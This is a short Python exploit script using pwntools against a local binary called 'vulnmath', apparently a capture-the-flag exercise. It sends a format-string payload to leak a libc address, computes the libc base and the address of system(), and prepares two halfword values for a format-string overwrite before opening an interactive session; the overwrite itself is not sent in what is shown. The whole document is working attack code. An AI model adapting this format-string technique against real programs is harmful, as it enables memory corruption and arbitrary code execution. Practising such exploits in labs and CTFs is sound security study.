from pwn import *

s=process("./vulnmath")
libc=ELF("libc.so.6")
s.sendline("%23$x")
s.recvuntil("> Incorrect!\n")
leak=int(s.recvline()[:-1],16)
log.info("LEAK :"+hex(leak))

libc_base=leak-0x1efb9
system=libc_base+libc.symbols['system']
log.info("SYSTEM :"+hex(system))
WriteOne=(system & 0xffff)-0x8
WriteTwo=((system & 0xffff0000)>>16)-WriteOne-0x8
s.interactive()